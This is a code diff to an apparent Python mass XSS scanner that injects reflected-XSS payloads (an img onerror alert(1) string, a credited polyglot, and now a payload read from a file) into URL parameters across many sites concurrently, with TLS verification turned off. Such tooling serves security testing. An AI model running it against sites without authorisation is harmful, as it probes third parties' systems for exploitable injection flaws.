@@ -5,10 +5,10 @@ from colorama import Fore
 from urllib.parse import urlencode, parse_qs, urlsplit, urlunsplit, urlparse, quote, urlunparse
 
 class MassScanner:
-    def __init__(self, file, output , concurrency, timeout, redactDomains=False):
+    def __init__(self, file, output , concurrency, timeout, payload=False, redactDomains=False):
         self.file = file
         self.output = output
-        self.payload =  '"><img//////src=x oNlY=1 oNerror=alert(1)//'
+        self.payload = self.loadPayload(payload)
         self.encodedPayload = quote(self.payload.replace(" ", "+") , safe="+" )
         self.polygotPayload =  quote(""""jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )////</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e""") # Thanks to @0xsobky - https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
         self.concurrency = concurrency
@@ -18,8 +18,23 @@ class MassScanner:
         self.totalFound = 0
         self.totalScanned = 0
         self.t0 = time.time()
-    
-    def redactURL(self, url):
+
+    @staticmethod
+    def loadPayload(payload):
+        default_payload = '"><img//////src=x oNlY=1 oNerror=alert(1)//'
+
+        if payload:
+            try:
+                with open(payload, "r") as file:
+                    return file.readline().strip()
+            except:
+                print(f"Error loading payload file: {payload}")
+                return default_payload
+        else:
+            return default_payload
+
+    @staticmethod
+    def redactURL(url):
         parsedUrl = urlparse(url)
         redactedUrl = parsedUrl._replace(netloc="REDACTED")
         return urlunparse(redactedUrl)
@@ -49,27 +64,23 @@ class MassScanner:
             try:
                 responseText = ""
                 async with session.get(url, allow_redirects=True) as resp:
-                    isAborted = False
                     responseHeaders = resp.headers
                     
                     contentType = responseHeaders.get("Content-Type","")
                     contentLength = int(responseHeaders.get("Content-Length", -1))
                     
-                    if "text/html" not in contentType:
+                    if "text/html" not in contentType or contentLength > 1000000:
                             resp.connection.transport.abort()
-                            isAborted = True
-                
-                    elif contentLength > 1000000:
-                            resp.connection.transport.abort()
-                            isAborted = True
-        
-                    if not isAborted:
+                            return (responseText, url)
+                    else:
                         content = await resp.read()
-                        encoding =  resp.get_encoding() or 'utf-8'
+                        encoding = 'utf-8'
                         responseText = content.decode(encoding, errors="ignore")
             except:
                 pass
 
+            await asyncio.sleep(0)
+            
             return (responseText , url)
 
     def processTasks(self, done):
@@ -86,7 +97,7 @@ class MassScanner:
         sem = asyncio.Semaphore(self.concurrency)
         timeout = aiohttp.ClientTimeout(total=self.timeout)
 
-        async with aiohttp.ClientSession(timeout=timeout,connector=aiohttp.TCPConnector(verify_ssl=False, limit=0, enable_cleanup_closed=True)) as session:
+        async with aiohttp.ClientSession(timeout=timeout,connector=aiohttp.TCPConnector(ssl=False, limit=0, enable_cleanup_closed=True)) as session:
             urlsFile = open(self.file, "r")
             line = urlsFile.readline()
             while line:
@@ -115,4 +126,4 @@ class MassScanner:
         print(f"{Fore.YELLOW} [i] Scanning finished. All URLs are saved to {self.output}")
         print(f"{Fore.YELLOW} [i] Total found: {self.totalFound}")
         print(f"{Fore.YELLOW} [i] Total scanned: {self.totalScanned}")
-        print(f"{Fore.YELLOW} [i] Time taken: {int(time.time() - self.t0)} seconds")   
+        print(f"{Fore.YELLOW} [i] Time taken: {int(time.time() - self.t0)} seconds")
